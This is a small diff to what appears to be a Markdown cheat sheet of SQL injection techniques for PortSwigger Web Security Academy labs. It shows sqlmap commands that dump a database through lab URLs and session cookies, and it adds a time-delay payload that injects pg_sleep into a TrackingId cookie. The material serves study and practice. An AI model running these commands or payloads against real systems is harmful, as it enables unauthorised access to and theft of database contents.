@@ -77,7 +77,9 @@ sqlmap -u 'https://0af800e604055c7d819e399800bf00c6.web-security-academy.net/fil
 **Blind SQL injection with conditional responses**
 sqlmap -u 'https://0af8009d04c75cb982ec1fad00b000f3.web-security-academy.net/' --cookie='TrackingId=vXlhdCuFfEh7btYf; session=vOVSLroAEJ568bYWzcLsRf7OY9fKVohP' --level 2 --dbms=oracle --dump --threads=5
 
- 
+
+ **Time Dealys sql:**
+ Cookie: TrackingId=x' || pg_sleep(10)--; session=
 ## Summary
 
 * [Recon for SQLi Vulnerabilities](#recon)
